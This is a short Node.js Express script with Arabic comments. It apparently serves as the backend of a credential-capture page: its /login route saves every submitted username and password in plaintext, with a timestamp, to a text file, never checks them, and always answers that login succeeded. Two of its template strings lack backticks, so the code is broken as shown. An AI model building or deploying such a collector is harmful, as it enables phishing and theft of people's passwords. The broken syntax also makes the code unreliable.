const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

// إعداد body-parser للتعامل مع بيانات POST
app.use(bodyParser.json());

// استقبال البيانات من الموقع
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    const timestamp = new Date().toLocaleString();

    // حفظ البيانات في ملف
    const data = الوقت: ${timestamp}, اسم المستخدم: ${username}, كلمة المرور: ${password}\n;
    fs.appendFile('logins.txt', data, (err) => {
        if (err) throw err;
        console.log('تم حفظ البيانات!');
    });

    res.send('تم تسجيل الدخول بنجاح!');
});

// تشغيل الخادم
app.listen(port, () => {
    console.log(الخادم يعمل على http://localhost:${port});
});
